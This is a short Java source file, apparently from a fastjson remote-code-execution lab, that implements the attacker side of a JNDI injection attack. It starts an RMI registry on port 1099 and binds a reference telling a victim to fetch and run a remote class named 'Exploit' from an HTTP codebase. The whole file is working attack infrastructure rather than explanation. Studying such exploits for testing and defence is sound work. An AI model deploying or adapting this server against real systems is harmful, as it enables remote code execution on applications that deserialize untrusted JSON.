package com.lyhistory.rce.fastjson.rmi_jndi;

import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

import javax.naming.NamingException;
import javax.naming.Reference;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

public class AttackerServer {
	public static void start() throws AlreadyBoundException, RemoteException, NamingException {
		System.setProperty("java.rmi.server.hostname", "127.0.0.1"); // important for remote deployment
		Registry registry = LocateRegistry.createRegistry(1099);
		Reference reference = new Reference("com.lyhistory.rce.fastjson.Exploit", "com.lyhistory.rce.fastjson.Exploit", "http://127.0.0.1/");
		ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
		registry.bind("Exploit", referenceWrapper);
	}

	public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
		start();
	}
}